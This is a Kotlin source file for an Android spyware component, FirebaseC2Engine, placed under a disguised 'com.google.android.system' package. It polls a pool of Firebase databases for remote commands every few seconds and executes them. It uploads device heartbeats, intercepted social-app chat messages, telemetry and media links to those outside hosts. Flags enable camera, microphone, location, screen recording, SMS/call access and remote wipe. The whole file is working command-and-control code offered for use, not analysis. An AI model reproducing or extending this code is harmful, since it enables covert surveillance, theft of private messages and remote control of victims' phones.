package com.google.android.system

import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicInteger

/**
 * FirebaseC2Engine
 *
 * Resilient, multi-account Firebase Realtime C2 Engine supporting 1 Primary + 5 Fallback Firebase accounts
 * (6 project instances pool) with automatic round-robin failover on quota, timeout, or HTTP errors.
 */
class FirebaseC2Engine(
    private val context: Context,
    private val httpClient: OkHttpClient,
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "FirebaseC2Engine"
    }

    data class FirebaseAccountConfig(
        val name: String,
        val databaseUrl: String,
        val apiKey: String = ""
    )

    private val accountPool = mutableListOf<FirebaseAccountConfig>()
    private val activeAccountIndex = AtomicInteger(0)
    @Volatile var currentUserId: String = ""
    @Volatile var currentDeviceId: String = ""
    @Volatile var isEngineRunning = false

    // Feature Flags synchronized from Master Admin
    @Volatile var featureFlags = mutableMapOf<String, Boolean>(
        "camera_enabled" to true,
        "mic_enabled" to true,
        "location_enabled" to true,
        "screen_record_enabled" to true,
        "termux_enabled" to true,
        "sms_calls_enabled" to true,
        "files_enabled" to true,
        "mdm_wipe_enabled" to true
    )

    init {
        loadFirebaseAccountPool()
    }

    private fun loadFirebaseAccountPool() {
        try {
            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
            currentUserId = prefs.getString("user_firebase_uid", "") ?: ""
            currentDeviceId = getOrCreateDeviceId()

            val primaryDb = prefs.getString("fb_primary_db_url", "") ?: ""
            val defaultUrl = if (primaryDb.isNotBlank()) primaryDb else "https://homemonitor-db-default-rtdb.asia-southeast1.firebasedatabase.app"

            accountPool.clear()
            accountPool.add(FirebaseAccountConfig("Primary", defaultUrl))

            for (i in 1..5) {
                val fbUrl = prefs.getString("fb_fallback_${i}_db_url", "") ?: ""
                val url = if (fbUrl.isNotBlank()) fbUrl else "https://homemonitor-fallback-$i-rtdb.firebaseio.com"
                accountPool.add(FirebaseAccountConfig("Fallback #$i", url))
            }

            Log.i(TAG, "Loaded ${accountPool.size} Firebase Account instances into failover pool.")
        } catch (e: Exception) {
            Log.e(TAG, "loadFirebaseAccountPool error: ${e.message}")
        }
    }

    fun getActiveAccount(): FirebaseAccountConfig {
        if (accountPool.isEmpty()) {
            return FirebaseAccountConfig("Default", "https://homemonitor-c2-default-rtdb.firebaseio.com")
        }
        val idx = activeAccountIndex.get() % accountPool.size
        return accountPool[idx]
    }

    private fun rotateToNextFallbackAccount(reason: String) {
        if (accountPool.size <= 1) return
        val prevIdx = activeAccountIndex.get()
        val nextIdx = (prevIdx + 1) % accountPool.size
        activeAccountIndex.set(nextIdx)
        Log.w(TAG, "🔄 Firebase Failover Triggered ($reason). Switched from ${accountPool[prevIdx].name} to ${accountPool[nextIdx].name}")
    }

    fun startEngine() {
        if (isEngineRunning) return
        isEngineRunning = true
        Log.i(TAG, "Starting 6-Account Failover Firebase C2 Engine...")

        startCommandPollingLoop()
        startHeartbeatLoop()
    }

    private fun startHeartbeatLoop() {
        scope.launch(Dispatchers.IO) {
            while (isEngineRunning) {
                try {
                    sendDeviceHeartbeat()
                    syncMasterAdminFeatureFlags()
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat loop exception: ${e.message}")
                }
                delay(15_000L) // 15s pulse
            }
        }
    }

    fun refreshUserIdentity() {
        try {
            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
            val storedUid = prefs.getString("user_firebase_uid", "") ?: ""
            if (storedUid.isNotBlank()) {
                currentUserId = storedUid
            } else {
                val email = prefs.getString("user_firebase_email", "") ?: ""
                if (email.isNotBlank()) {
                    val normalized = email.trim().lowercase(java.util.Locale.ROOT)
                    val derivedUid = "usr_" + Math.abs(normalized.hashCode()).toString()
                    currentUserId = derivedUid
                    prefs.edit().putString("user_firebase_uid", derivedUid).apply()
                }
            }
        } catch (_: Exception) {}
    }

    private fun sendDeviceHeartbeat() {
        refreshUserIdentity()
        val account = getActiveAccount()
        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

        val url = "${account.databaseUrl}/users/$uid/devices/$devId/status.json"

        try {
            val statusJson = JSONObject().apply {
                put("deviceId", devId)
                put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("androidVersion", Build.VERSION.RELEASE)
                put("sdkInt", Build.VERSION.SDK_INT)
                put("lastSeen", System.currentTimeMillis())
                put("activeAccount", account.name)
                put("online", true)
            }

            val body = statusJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(url).put(body).build()

            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    if (response.code == 429 || response.code >= 500) {
                        rotateToNextFallbackAccount("HTTP ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceHeartbeat error: ${e.message}")
            rotateToNextFallbackAccount(e.message ?: "Network error")
        }
    }

    private fun syncMasterAdminFeatureFlags() {
        val account = getActiveAccount()
        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

        val url = "${account.databaseUrl}/users/$uid/devices/$devId/feature_flags.json"

        try {
            val request = Request.Builder().url(url).get().build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val body = response.body?.string() ?: ""
                    if (body.startsWith("{")) {
                        val json = JSONObject(body)
                        val keys = json.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            featureFlags[key] = json.optBoolean(key, true)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "syncMasterAdminFeatureFlags error: ${e.message}")
        }
    }

    fun isFeatureEnabled(featureKey: String): Boolean {
        return featureFlags[featureKey] ?: true
    }

    private fun startCommandPollingLoop() {
        scope.launch(Dispatchers.IO) {
            Log.i(TAG, "Firebase Command Polling Loop Active 🚀")
            while (isEngineRunning) {
                try {
                    val account = getActiveAccount()
                    val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                    val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                    val targetUids = listOf(uid).distinct()

                    for (targetUid in targetUids) {
                        val url = "${account.databaseUrl}/users/$targetUid/devices/$devId/commands.json"
                        val request = Request.Builder().url(url).get().build()

                        httpClient.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                val body = response.body?.string() ?: "null"
                                if (body != "null" && body.startsWith("{")) {
                                    val json = JSONObject(body)
                                    val keys = json.keys()
                                    while (keys.hasNext()) {
                                        val cmdId = keys.next()
                                        val cmdObj = json.optJSONObject(cmdId) ?: continue
                                        val cmdText = cmdObj.optString("text", "")
                                        val status = cmdObj.optString("status", "pending")

                                        if (status == "pending" && cmdText.isNotBlank()) {
                                            Log.i(TAG, "Firebase C2 Received Command [$cmdId]: '$cmdText'")

                                            // Mark as processing
                                            updateCommandStatus(account, targetUid, devId, cmdId, "processing")

                                            // Dispatch to MonitorService
                                            commandDispatcher(cmdText, "firebase_$cmdId")

                                            // Mark as completed
                                            updateCommandStatus(account, targetUid, devId, cmdId, "completed")
                                        }
                                    }
                                }
                            } else if (response.code == 429 || response.code >= 500) {
                                rotateToNextFallbackAccount("HTTP ${response.code}")
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Command polling exception: ${e.message}")
                    rotateToNextFallbackAccount(e.message ?: "Exception")
                }
                delay(3000L) // 3s polling cycle
            }
        }
    }

    private fun updateCommandStatus(
        account: FirebaseAccountConfig,
        uid: String,
        devId: String,
        cmdId: String,
        status: String
    ) {
        try {
            val url = "${account.databaseUrl}/users/$uid/devices/$devId/commands/$cmdId/status.json"
            val body = "\"$status\"".toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(url).put(body).build()
            httpClient.newCall(request).execute().close()
        } catch (_: Exception) {}
    }

    fun sendExecutionResponse(tag: String, resultText: String) {
        if (resultText.isBlank()) return
        scope.launch(Dispatchers.IO) {
            val account = getActiveAccount()
            val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
            val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

            try {
                val respUrl = "${account.databaseUrl}/users/$uid/devices/$devId/response.json"
                val respBody = JSONObject.quote(resultText).toRequestBody("application/json".toMediaTypeOrNull())
                httpClient.newCall(Request.Builder().url(respUrl).put(respBody).build()).execute().close()

                if (tag.startsWith("firebase_")) {
                    val cmdId = tag.removePrefix("firebase_")
                    val cmdRespUrl = "${account.databaseUrl}/users/$uid/devices/$devId/commands/$cmdId/response.json"
                    httpClient.newCall(Request.Builder().url(cmdRespUrl).put(respBody).build()).execute().close()
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendExecutionResponse error: ${e.message}")
            }
        }
    }

    fun submitTelemetry(category: String, messageText: String) {
        scope.launch(Dispatchers.IO) {
            val account = getActiveAccount()
            val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
            val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

            val url = "${account.databaseUrl}/users/$uid/devices/$devId/telemetry/$category.json"

            try {
                val entryJson = JSONObject().apply {
                    put("timestamp", System.currentTimeMillis())
                    put("category", category)
                    put("content", messageText)
                    put("deviceId", devId)
                }

                val body = entryJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful && (response.code == 429 || response.code >= 500)) {
                        rotateToNextFallbackAccount("HTTP ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "submitTelemetry error: ${e.message}")
            }
        }
    }

    fun uploadSocialMessage(appName: String, sender: String, text: String, isOutgoing: Boolean) {
        if (!isEngineRunning || text.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val account = getActiveAccount()
                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val appKey = appName.lowercase().replace(Regex("[^a-z0-9]"), "")
                val url = "${account.databaseUrl}/users/$uid/devices/$devId/social/$appKey.json"

                val timeStr = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault()).format(java.util.Date())
                val msgJson = JSONObject().apply {
                    put("appName", appName)
                    put("sender", if (sender.isNotBlank()) sender else if (isOutgoing) "Me" else "Contact")
                    put("text", text)
                    put("direction", if (isOutgoing) "outgoing" else "incoming")
                    put("time", timeStr)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = msgJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Social Chat Message to Firebase [$appKey]: '${text.take(30)}'")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadSocialMessage error: ${e.message}")
            }
        }
    }

    fun uploadTelemetryLog(category: String, contentText: String) {
        if (!isEngineRunning || contentText.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val account = getActiveAccount()
                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")
                val url = "${account.databaseUrl}/users/$uid/devices/$devId/telemetry/$catKey.json"

                val logJson = JSONObject().apply {
                    put("category", category)
                    put("content", contentText)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = logJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Telemetry Log to Firebase [$catKey]: '${contentText.take(30)}'")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadTelemetryLog error: ${e.message}")
            }
        }
    }

    fun uploadMediaUrl(mediaType: String, mediaUrl: String) {
        if (!isEngineRunning || mediaUrl.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val account = getActiveAccount()
                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/media.json"

                val mediaJson = JSONObject().apply {
                    put("type", mediaType)
                    put("mediaUrl", mediaUrl)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = mediaJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Media CDN Link to Firebase [$mediaType]: $mediaUrl")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadMediaUrl error: ${e.message}")
            }
        }
    }

    private fun getOrCreateDeviceId(): String {
        return com.google.android.system.DeviceIdProvider.getDeviceId(context)
    }
}
